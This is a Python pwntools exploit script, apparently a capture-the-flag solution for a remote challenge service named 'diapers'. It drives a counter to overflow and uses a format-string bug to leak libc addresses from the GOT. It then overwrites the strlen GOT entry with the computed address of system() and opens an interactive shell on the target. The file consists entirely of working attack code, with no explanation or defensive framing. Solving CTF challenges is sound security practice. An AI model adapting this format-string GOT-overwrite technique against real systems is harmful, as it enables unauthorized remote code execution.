#!/bin/python2

from pwn import *

proc = remote('diapers.asis-ctf.ir', 1343)

proc.recvuntil(">")
proc.send("3\n")
proc.recvuntil(">")

print "[*] Setting counter to 0xffffffff"

for i in range(257):
	proc.send("1\n")
	proc.recvuntil(">")

print "[*] Finished setting counter to 0xffffffff"

def evalFormatString(string, size):
	padding_len = 15
	system_eval = "/bin/sh;\n"
	buffor = system_eval+(padding_len-len(system_eval))*'A'
	buffor += string
	buffor += (size-padding_len-len(string))*' '
	proc.send("0\n"+buffor)
	proc.recvuntil(">")
	proc.send("2\n")
	proc.recvuntil("\n", timeout=1)
	ret = proc.recvuntil("\n", timeout=1)
	proc.recvuntil(">", timeout=1)
	return ret

def ArbitraryWrite(addr, value):
	adress_1 = p32(addr)
	adress_2 = p32(addr+2)

	value_1 = (((value & 0xffff0000)>>16))
	value_2 = ((value & 0xffff))

	evalFormatString(adress_1+adress_2+'%'+'%d'%(value_2-8)+'x%18$hn'+'%'+'%d'%(value_1-value_2)+'x%19$hn', buffer_size)

def LeakAdress(addr):
	adress = p32(addr)

	res_str = evalFormatString(adress+"%18$s", buffer_size).encode('hex')[8:16]
	rev_str = ""
	for i in range(len(res_str)/2):
		rev_str = res_str[2*i:2*i+2] + rev_str

	return int("0x"+rev_str,16)

buffer_size = 108
print "[*] Controled buffor size: %d"%buffer_size

GOT_strlen_addr = 0x0804b028
GOT_memset_addr = 0x0804b034
GOT_lib_start_main_addr = 0x0804b02c
system_offset = 0x0003ad80-0x00018540

print "[*] Leaking GOT entries"
strlen_addr = LeakAdress(GOT_strlen_addr)
lib_start_main_addr = LeakAdress(GOT_lib_start_main_addr)
print "[*] Libc strlen addr: " + hex(strlen_addr)
print "[*] Libc memset addr: " + hex(LeakAdress(GOT_memset_addr))
print "[*] Libc __libc_start_main addr: " + hex(lib_start_main_addr)

print "[*] Overwriting strlen GOT entry to: " + hex(lib_start_main_addr+system_offset)
ArbitraryWrite(GOT_strlen_addr, lib_start_main_addr+system_offset)

proc.send("0\n")

print "[*] Enjoy your shell!"
proc.interactive()

proc.close()
